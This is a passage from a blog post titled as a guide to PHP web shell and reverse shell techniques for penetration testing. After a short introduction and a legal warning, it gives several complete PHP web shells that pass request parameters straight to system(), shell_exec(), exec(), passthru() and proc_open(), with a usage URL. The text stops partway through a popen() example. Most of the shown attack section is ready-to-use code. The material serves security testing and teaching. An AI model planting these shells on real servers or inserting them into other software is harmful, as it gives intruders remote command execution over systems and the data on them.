---
title: PHP Web Shell and Reverse Shell Techniques for Linux: 45+ Methods for Penetration Testing
url: https://www.hackingdream.net/2025/11/php-web-shell-and-reverse-shell-techniques.html
source: Hacking Dream
date: 2025-11-27
fetch_date: 2025-11-28T03:12:28.509877
---

# PHP Web Shell and Reverse Shell Techniques for Linux: 45+ Methods for Penetration Testing

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### PHP Web Shell and Reverse Shell Techniques for Linux: 45+ Methods for Penetration Testing

[November 27, 2025](https://www.hackingdream.net/2025/11/php-web-shell-and-reverse-shell-techniques.html "permanent link")

PHP Web Shell and Reverse Shell Techniques: 45+ Methods for Penetration Testing (2025)

# The Complete Guide to PHP Web Shell and Reverse Shell Techniques: 45+ Methods for Penetration Testing (2025)

*Updated on November 27, 2025*

**Meta Description:** Master 45+ PHP web shell and reverse shell techniques for authorized penetration testing. Learn command execution methods, obfuscation tactics, and defense strategies with ready-to-use code examples.

## Table of Contents

1. [Introduction to Web Shells and Reverse Shells](#introduction)
2. [Web Shell Execution Techniques (20+ Methods)](#webshell-techniques)
3. [Reverse Shell Connection Methods (25+ Techniques)](#reverse-shell-techniques)
4. [Obfuscation and Evasion Techniques](#obfuscation-techniques)
5. [MITRE ATT&CK Framework Mapping](#mitre-mapping)
6. [Detection and Defense Strategies](#defense-strategies)

## Introduction to Web Shells and Reverse Shells

Web shells and reverse shells are critical tools in penetration testing and red team operations, allowing security professionals to assess the resilience of web applications and server environments against unauthorized access. Understanding these techniques is essential for both offensive security practitioners conducting authorized assessments and defensive teams building robust detection mechanisms.

[![PHP Web Shell and Reverse Shell Techniques for Linux: 45+ Methods for Penetration Testing](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLF0-RZkNGumr0ozr66XHNkT-Pk19wDpoDMDYPgsout9jfZ7BEPtnv5KjmrKMDX8e4Kiqwp2ruWW7W2Ubm1dPVhElQzpntjOTGDGYbAy71B6UyL1sv93MFlpS_jgh3gaqefxKmbMpCEUIUdraUN8sEGyB3UqLDC4BzdRW2yMmiaQMK0bQ6BkzXGmzOL0XI/w640-h340/The-Complete-Guide-to-PHP-Web-Shell-and-Reverse-Shells.jpg "PHP Web Shell and Reverse Shell Techniques for Linux: 45+ Methods for Penetration Testing")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLF0-RZkNGumr0ozr66XHNkT-Pk19wDpoDMDYPgsout9jfZ7BEPtnv5KjmrKMDX8e4Kiqwp2ruWW7W2Ubm1dPVhElQzpntjOTGDGYbAy71B6UyL1sv93MFlpS_jgh3gaqefxKmbMpCEUIUdraUN8sEGyB3UqLDC4BzdRW2yMmiaQMK0bQ6BkzXGmzOL0XI/s1024/The-Complete-Guide-to-PHP-Web-Shell-and-Reverse-Shells.jpg)

### What is a Web Shell?

A web shell is a script uploaded to a web server that enables remote command execution through HTTP requests. These shells provide attackers—or penetration testers—with persistent access to compromised systems, allowing them to execute arbitrary commands, upload/download files, and pivot to other systems.

### What is a Reverse Shell?

A reverse shell is a connection initiated from the target system back to the attacker's machine. Unlike bind shells (which open listening ports on the target), reverse shells bypass firewall restrictions by establishing outbound connections, which are typically less restricted in corporate environments.

### Legal and Ethical Considerations

**WARNING:** All techniques described in this article are for authorized penetration testing and educational purposes only. Unauthorized access to computer systems is illegal under laws such as the Computer Fraud and Abuse Act (CFAA) in the United States and similar legislation worldwide.

## Web Shell Execution Techniques (20+ Methods)

PHP provides numerous functions for executing system commands, each with different behaviors and security implications. Understanding these variations is crucial for comprehensive security testing. Check out our [[Internal Penetration Testing Guide]](INSERT_INTERNAL_URL) for more foundational concepts.

### 1. Direct Command Execution Functions

#### system() - Output Directly to Browser

The `system()` function executes external programs and displays output directly:

`<?php
// Basic system() webshell
if(isset($_GET['cmd'])) {
system($_GET['cmd']);
}
?>`

**Usage Example:**

`http://target.com/shell.php?cmd=whoami`

**Detection Signature:** High - commonly flagged by WAF/IDS
**MITRE ATT&CK:** T1059.004 (Command and Scripting Interpreter: Unix Shell)

#### shell\_exec() - Return Output as String

The `shell_exec()` function returns command output as a string rather than displaying it directly:

`<?php
// shell_exec() webshell
if(isset($_GET['cmd'])) {
$output = shell_exec($_GET['cmd']);
echo "<pre>$output</pre>";
}
?>`

**Advantages:**

* Output can be processed before display
* Supports output manipulation and filtering
* Can be used in more complex scripts

#### exec() - Line-by-Line Output

The `exec()` function returns output as an array, with each line as a separate element:

`<?php
// exec() webshell with array output
if(isset($_POST['cmd'])) {
exec($_POST['cmd'], $output, $return_code);
echo "Exit Code: $return_code<br>";
echo "<pre>" . implode("\n", $output) . "</pre>";
}
?>`

**Key Feature:** Returns exit status code, useful for error handling

#### passthru() - Binary-Safe Execution

The `passthru()` function is designed for binary output and passes data directly to the browser:

`<?php
// passthru() for binary data
if(isset($_GET['cmd'])) {
passthru($_GET['cmd']);
}
?>`

**Use Case:** Ideal for executing commands that output binary data (images, compressed files)

### 2. Advanced Process Management Functions

#### proc\_open() - Full Process Control

The `proc_open()` function provides comprehensive process control with separate handles for STDIN, STDOUT, and STDERR:

`<?php
// proc_open() webshell with full I/O control
if(isset($_POST['cmd'])) {
$descriptorspec = array(
0 => array("pipe", "r"), // stdin
1 => array("pipe", "w"), // stdout
2 => array("pipe", "w") // stderr
);
$process = proc_open($_POST['cmd'], $descriptorspec, $pipes);
if (is_resource($process)) {
fclose($pipes[0]);
$stdout = stream_get_contents($pipes[1]);
$stderr = stream_get_contents($pipes[2]);
fclose($pipes[1]);
fclose($pipes[2]);
$return_value = proc_close($process);
echo "<h3>STDOUT:</h3><pre>$stdout</pre>";
echo "<h3>STDERR:</h3><pre>$stderr</pre>";
echo "<h3>Exit Code: $return_value</h3>";
}
}
?>`

**Advanced Features:**

* Separate error handling
* Interactive process communication
* Environment variable control

#### popen() - Pipe-Based Execution

The `popen()` function opens a pipe to a process for reading or writing:

`<?php
// popen() webshell with streaming output...